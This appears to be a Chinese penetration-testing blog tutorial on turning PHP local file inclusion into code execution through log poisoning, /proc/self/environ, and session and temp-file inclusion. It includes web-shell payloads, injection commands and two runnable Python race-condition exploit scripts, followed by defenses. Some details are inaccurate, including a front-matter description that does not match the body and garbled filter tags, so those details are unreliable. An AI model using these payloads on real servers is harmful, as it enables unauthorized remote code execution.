---
title: "文件包含漏洞：日志注入与Session包含"
date: 2025-02-03 14:17:03
tags:
  - Web安全
  - 渗透测试
description: Session 安全攻防——会话固定、Session ID 可预测性与 Cookie 属性安全。
categories: 渗透测试
---

## 前言

文件包含漏洞（File Inclusion）是 Web 安全中常见的漏洞类型。当应用使用用户可控输入动态包含文件时，攻击者可借此读取敏感文件，甚至实现远程代码执行（RCE）。很多人认为本地文件包含（LFI）"只能读文件"，但通过日志注入（Log Poisoning）和 Session 文件包含等技术，LFI 可以升级为完整的代码执行。本文将系统性地梳理这些攻击方法。

> **免责声明**：本文技术仅供安全研究与授权测试。未经授权的攻击行为均属违法，使用者须自行承担责任。

---

## 一、Apache Access Log Poisoning

### 1.1 基本原理

Apache 将 HTTP 访问日志默认写入 `/var/log/apache2/access.log`。攻击者请求中包含 PHP 代码时，该代码被原样记录到日志中；通过 LFI 包含该日志文件后，PHP 引擎解析并执行其中的代码。

### 1.2 攻击流程

**第 1 步：发送携带 PHP 代码的 HTTP 请求**

最佳注入位置是 `User-Agent` 头——日志格式必含 User-Agent 且该字段允许任意字符。URI 路径也可注入：

```http
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 <?php phpinfo(); ?>
```

日志条目呈现为：

```
192.168.1.100 - - [15/Sep/2025:10:30:45] "GET /<?php system($_GET['cmd']); ?> HTTP/1.1" 404 512 "-" "Mozilla/5.0 <?php phpinfo(); ?>"
```

**第 2 步：通过 LFI 包含日志**

```
http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id
```

PHP 解析日志遇到 `<?php ... ?>` 标签后执行代码。

### 1.3 常见日志路径

| 操作系统 | Apache 访问日志 |
|---------|---------------|
| Debian/Ubuntu | `/var/log/apache2/access.log` |
| RHEL/CentOS | `/var/log/httpd/access_log` |
| Arch Linux | `/var/log/httpd/access_log` |
| FreeBSD | `/var/log/httpd-access.log` |
| XAMPP (Linux) | `/opt/lampp/logs/access_log` |
| XAMPP (Windows) | `C:\xampp\apache\logs\access.log` |

### 1.4 绕过日志编码

某些 Apache 配置使用 `mod_log_config` 对特殊字符编码（空格→`%20`），导致 PHP 代码无法正确执行。此时可使用无空格、无特殊字符的 short tag payload：

```php
<?=`$_GET[0]`?>
```

此 payload 不受编码影响，但需要目标启用 `short_open_tag`（PHP 5.4 起默认开启）。

---

## 二、SSH Auth Log Poisoning

### 2.1 攻击原理

SSH 认证日志 `/var/log/auth.log` 记录每次登录尝试的用户名。攻击者在 SSH 连接时将 PHP 代码注入用户名，即使登录失败，日志也会保留恶意代码，随后通过 LFI 执行：

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

日志内容示例：

```
Sep 15 10:45:22 server sshd[1234]: Failed password for <?php system($_GET["cmd"]); ?> from 192.168.1.200 port 44444 ssh2
```

然后 LFI 包含：

```
http://target.com/index.php?page=/var/log/auth.log&cmd=whoami
```

### 2.2 常见认证日志路径

| 发行版 | auth.log |
|-------|----------|
| Debian/Ubuntu | `/var/log/auth.log` |
| RHEL/CentOS | `/var/log/secure` |
| FreeBSD | `/var/log/auth.log` |

### 2.3 FTP 登录日志

类似思路适用于 FTP 服务。连接时在用户名中注入 PHP：

```bash
ftp> open target.com
Name: <?php system($_GET['cmd']); ?>
```

vsftpd 日志路径：`/var/log/vsftpd.log`

---

## 三、Mail Log Poisoning

### 3.1 原理

若目标运行邮件服务（Sendmail/Postfix），`/var/log/mail.log` 记录所有收发信息。攻击者通过发送含 PHP 代码的邮件注入日志。

### 3.2 攻击演示

使用 telnet 连接 SMTP 端口 25，在 `MAIL FROM` 中注入 payload：

```
telnet target.com 25
EHLO attacker.com
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: admin@target.com
DATA
Subject: Test
.
QUIT
```

发送后 `/var/log/mail.log` 出现：

```
Sep 15 11:02:15 server sendmail[5678]: from=<?php system($_GET['cmd']); ?>, size=...
```

### 3.3 邮件日志路径

| 服务 | 日志路径 |
|-----|---------|
| Postfix | `/var/log/mail.log` |
| Sendmail | `/var/log/maillog` |
| Exim | `/var/log/exim/mainlog` |

---

## 四、/proc/self/environ 注入

### 4.1 原理

Linux 伪文件系统 `/proc/self/environ` 存储当前进程环境变量。Apache/Nginx 将 HTTP 头转为环境变量：`User-Agent` → `HTTP_USER_AGENT`，`Accept-Language` → `HTTP_ACCEPT_LANGUAGE`。攻击者在 HTTP 头中注入 PHP 代码后，通过 LFI 包含 `/proc/self/environ` 即可执行。

### 4.2 攻击演示

```bash
curl -H "User-Agent: <?php system('id'); ?>" \
  "http://target.com/index.php?page=/proc/self/environ"
```

`/proc/self/environ` 格式为 `KEY=VALUE\0...`，PHP 解析其中的 PHP 标签后执行代码。

### 4.3 限制条件

- Apache `mod_env` 和 CGI 模式默认转换 HTTP 头；FastCGI/PHP-FPM 可能需要特定配置。
- 读取权限取决于 PHP 进程 uid。需要 `/proc/self/environ` 对 Web 用户可读。

---

## 五、PHP Session 文件包含

### 5.1 Session 存储机制

PHP 默认以文件存储 Session：Linux 下 `/tmp/sess_<id>` 或 `/var/lib/php/sessions/sess_<id>`，文件内容为 `key|serialized_value`。若攻击者能控制 `$_SESSION` 中某个值（如注册页面的用户名），则可将 PHP 代码写入 Session 文件。

### 5.2 经典攻击流程

1. 在注册表单用户名字段注入 `<?php system($_GET['cmd']); ?>`
2. 获取当前 Session ID（Cookie `PHPSESSID`）
3. 通过 LFI 包含：`http://target.com/index.php?page=/tmp/sess_abc123&cmd=id`

### 5.3 利用 session.upload_progress（无需注册）

PHP 5.4 引入 `session.upload_progress`，默认启用。攻击者可利用上传进度追踪机制将 PHP 代码写入 Session。

攻击者上传文件时传递 `PHP_SESSION_UPLOAD_PROGRESS` 字段，PHP 自动创建 Session 并将字段值写入文件。核心在于竞争窗口——Session 在上传期间存在，上传完成后被清理。

**Python 利用脚本：**

```python
import requests, threading
from io import BytesIO

url = "http://target.com/index.php"
lfi_param = "page"
session_path = "/tmp/sess_attacker"

def upload():
    while True:
        try:
            requests.post(url,
                files={'file': ('a.txt', BytesIO(b'A'*1024))},
                data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system($_GET["cmd"]);?>'},
                cookies={'PHPSESSID': 'attacker'})
        except: pass

def lfi():
    while True:
        try:
            r = requests.get(
                f"{url}?{lfi_param}={session_path}&cmd=id",
                cookies={'PHPSESSID': 'attacker'})
            if 'uid=' in str(r.content):
                print(f"[+] RCE: {r.text}"); break
        except: pass

threading.Thread(target=upload).start()
threading.Thread(target=lfi).start()
```

### 5.4 Session 路径汇总

| 环境 | 路径 |
|-----|-----|
| Linux 默认 | `/tmp/sess_<id>` |
| Linux Apache | `/var/lib/php/sessions/sess_<id>` |
| Windows XAMPP | `C:\xampp\tmp\sess_<id>` |
| Windows WAMP | `C:\wamp\tmp\sess_<id>` |

---

## 六、PHP 临时文件包含（phpinfo + LFI 条件竞争）

### 6.1 原理

PHP 处理文件上传时，即使代码没有 `move_uploaded_file()`，上传数据仍写入临时目录（Linux:`/tmp/phpXXXXXX`；Windows:`C:\Windows\Temp\phpXXXX.tmp`），请求结束时清理。

若 `phpinfo()` 页面暴露 `$_FILES['tmp_name']`，攻击者可结合 LFI 发起条件竞争：一边上传文件获取临时路径，一边高速包含该文件。

### 6.2 利用脚本片段

```python
import requests, re, threading

target = "http://target.com"
phpinfo_url = f"{target}/phpinfo.php"
lfi_url = f"{target}/index.php?page="

with open('shell.php', 'w') as f:
    f.write('<?php system($_GET["cmd"]); ?>')

def race():
    while True:
        files = {'file': open('shell.php', 'rb')}
        r = requests.post(phpinfo_url, files=files)
        m = re.search(r'\[tmp_name\] => (\S+\.tmp)', r.text)
        if m:
            r2 = requests.get(f"{lfi_url}{m.group(1)}?cmd=id")
            if 'uid=' in r2.text:
                print(f"[+] RCE via {m.group(1)}"); break

for _ in range(20):
    threading.Thread(target=race).start()
```

社区工具有 `LFISuite`、`phpinfoLFI.py` 等可自动化此过程。

---

## 七、Windows 应用日志

在 Windows 环境中，以下日志可作为注入目标：

| 日志类型 | 路径 |
|---------|------|
| IIS Web 日志 | `C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log` |
| FTP 服务日志 | `C:\inetpub\logs\LogFiles\FTPSVC1\` |
| SMTP 服务日志 | `C:\Windows\System32\LogFiles\SMTPSVC1\` |
| 事件日志（EVTX） | `C:\Windows\System32\winevt\Logs\Application.evtx` |

IIS 日志和 FTP 日志为纯文本格式，注入原理与 Apache access log 相同——在 User-Agent、URL、Referer 中注入 PHP 代码。例如：

```
http://target.com/index.php?page=C:\inetpub\logs\LogFiles\W3SVC1\u_ex250915.log&cmd=dir
```

需要注意：Windows 事件日志 `Application.evtx` 是二进制格式，PHP 直接包含时无法解析。

---

## 八、防御措施

### 8.1 代码层面

永远使用**白名单映射**，而非直接拼接用户输入到包含路径：

```php
$pages = [
    'home'  => '/var/www/templates/home.php',
    'about' => '/var/www/templates/about.php',
];
$page = $_GET['page'] ?? 'home';
if (!array_key_exists($page, $pages)) { die('Invalid page'); }
include $pages[$page];
```

在 `php.ini` 中配置 `disable_functions` 禁用危险函数：`system,exec,passthru,shell_exec,proc_open,popen,curl_exec,curl_multi_exec,show_source`。

### 8.2 服务器层面

1. **文件权限**——Apache 日志默认 `640 root:adm`，阻止 Web 用户读取。
2. **`open_basedir`**——限制 PHP 文件操作范围，排除日志目录和 `/proc`。
3. **Session 文件外迁**——使用 Redis 或数据库存储 Session。
4. **关闭 `session.upload_progress`**——`php.ini` 中设为 `Off`。
5. **隐藏 `phpinfo()`**——生产环境禁用或限制 IP 访问。

### 8.3 日志层面

日志写入前过滤 `<%php`、`<%?=` 等标签；在 WAF/反向代理层记录日志，确保 Web 本地不写入含无过滤用户输入的日志。

---

## 九、总结

LFI 到 RCE 的升级链在满足特定条件时高度可行：

| 技术 | 前提条件 |
|-----|---------|
| Apache access log | 日志路径已知、可读，未过滤 PHP 标签 |
| SSH auth log | `/var/log/auth.log` 对 Web 用户可读 |
| Mail log | 目标运行 SMTP，邮件日志可读 |
| /proc/self/environ | Apache CGI 模式，`/proc/self/environ` 可读 |
| PHP Session（upload_progress） | `session.upload_progress.enabled=On`，Session 路径已知 |
| PHP 临时文件竞争 | `phpinfo()` 暴露，可高速并发 LFI |
| Windows IIS 日志 | 日志路径已知，纯文本格式 |

在实际渗透测试中，日志注入与 Session 包含将"只读漏洞"转为"代码执行"是渗透工程师的核心技能。理解机制、熟练 payload、控制竞争窗口缺一不可。

> **再次声明**：本文仅用于安全研究与授权测试。未经授权攻击他人系统属于违法犯罪。
